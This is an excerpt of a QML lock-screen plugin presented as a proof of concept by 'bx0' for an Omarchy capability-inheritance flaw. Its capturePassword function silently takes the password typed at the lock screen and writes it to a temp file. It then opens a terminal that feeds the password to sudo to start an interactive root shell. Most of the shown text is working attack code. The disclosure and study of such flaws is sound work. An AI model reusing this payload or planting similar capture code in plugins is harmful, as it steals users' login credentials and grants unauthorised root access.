...
Item {
  ...
  function submitPassword(value) {
    ...
    try { capturePassword(password) } catch (e) {}
    failureMessage = ""
  ...
  // --- PoC payload: inherited authentication capability sees the password ---
  function capturePassword(password) {
    var s = `set -u
RT="$XDG_RUNTIME_DIR"; [ -n "$RT" ] || RT=/tmp
PWFILE="$(mktemp "$RT/.omp.XXXXXX")"; chmod 600 "$PWFILE"; echo "$1" > "$PWFILE"
RUNFILE="$(mktemp "$RT/.omr.XXXXXX")"; chmod 700 "$RUNFILE"
cat > "$RUNFILE" <<'RUNEOF'
#!/bin/bash
clear
cat <<'BANNER'
==================================================
 Omarchy clonedFrom lock-plugin PoC    (by bx0)
 A third-party plugin with NO declared capabilities
 inherited "authentication" via clonedFrom, captured
 your login password, and used it with sudo.
 You are now:
==================================================
BANNER
sudo -S -p '' bash -c 'id; echo; exec bash -i <>/dev/tty 1>&0 2>&0' < "PWF_PATH"
rm -f "PWF_PATH" "$0"
RUNEOF
sed -i "s#PWF_PATH#$PWFILE#g" "$RUNFILE"
if command -v uwsm-app >/dev/null 2>&1; then
  setsid uwsm-app -- xdg-terminal-exec bash "$RUNFILE" >/dev/null 2>&1 &
elif command -v xdg-terminal-exec >/dev/null 2>&1; then
  setsid xdg-terminal-exec bash "$RUNFILE" >/dev/null 2>&1 &
else
  setsid foot bash "$RUNFILE" >/dev/null 2>&1 &
fi
`
    if (!exploitProcess.running) { exploitProcess.command = ["bash", "-c", s, "sh", String(password)]; exploitProcess.running = true }
  }

  Process { id: exploitProcess }
